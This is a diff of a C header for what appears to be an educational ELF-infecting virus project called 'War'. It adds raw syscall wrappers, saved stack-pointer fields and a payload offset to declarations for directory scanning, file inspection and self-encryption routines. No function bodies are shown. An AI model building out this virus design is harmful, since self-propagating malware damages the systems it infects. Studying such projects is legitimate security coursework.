@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/22 15:13:39 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/25 19:48:50 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,18 +28,16 @@
 /* Enum */
 
 /* Define */
-
 # define SIGNATURE	0x216948	// 'Hi!'
 
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
 # define BUFF_SIZE	2048
+# define OFFSET		1461
 
 # define __INLINE__	__attribute__((always_inline)) inline
 
-
 /* Structures */
-
 typedef struct __attribute__ ((__packed__)) linux_dirent64
 {
 	__ino64_t			d_ino;          /* 64-bit inode number */
@@ -98,12 +96,14 @@ typedef struct	s_data
 	Elf64_Addr	vrs_entry;
 	Elf64_Addr	cpr_entry;
 
+	void		*rbp;
+	void		*rsp;
 	size_t		context;
 }				t_data;
 
 /* Core */
 void			start(void);
-void			cypher_beg(void);
+void			cypher_beg(t_data *data);
 void			war(t_data *data);
 void			locate(t_data *data, t_directory *dir);
 void			inspect(t_data *data, char *path);
@@ -120,6 +120,23 @@ void			update_one(t_key *key, char *ptr, size_t size);
 void			update_two(t_key *key, char *ptr, size_t size);
 void			revert_one(t_key *key, char *ptr, size_t size);
 void			revert_two(t_key *key, char *ptr, size_t size);
+
+/*
+**	Lib
+*/
+void			*_memcpy(void *d, void *s, size_t size);
+void			*_memset(void *b, int c, size_t len);
+size_t			_strlen(char *s);
+int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+int				_open(const char *path, int flags, mode_t mode);
+int				_fstat(int fd, struct stat *statbuf);
+int				_close(int fd);
+void			*_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset);
+int				_munmap(void *addr, size_t len);
+int				_write(int fd, const void *buf, size_t len);
+int				_getuid(void);
+int				_random_number(int limit);
+ssize_t			_get_random(void *buf, size_t buflen, unsigned int flags);
 void			end_of_data(void);
 
 #endif
